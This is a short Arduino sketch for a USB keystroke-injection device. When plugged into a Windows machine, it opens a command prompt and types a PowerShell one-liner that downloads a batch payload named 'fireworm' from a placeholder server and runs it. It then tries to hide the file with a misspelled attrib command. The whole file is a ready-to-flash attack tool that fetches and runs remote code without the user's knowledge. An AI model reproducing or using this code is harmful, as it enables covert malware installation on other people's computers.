#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  en.winRUN("cmd.exe");
  en.echoEnter("powershell (New-Object System.Net.WebClient).DownloadFile('http://ipserver or website/fireworm.txt','a.bat');Start-Process 'a.bat'");
  en.sleep(5);
  en.echoEnter("attrub +s +h a.bat");
  en.echoEnter("exit");
}

void loop() {
  
}
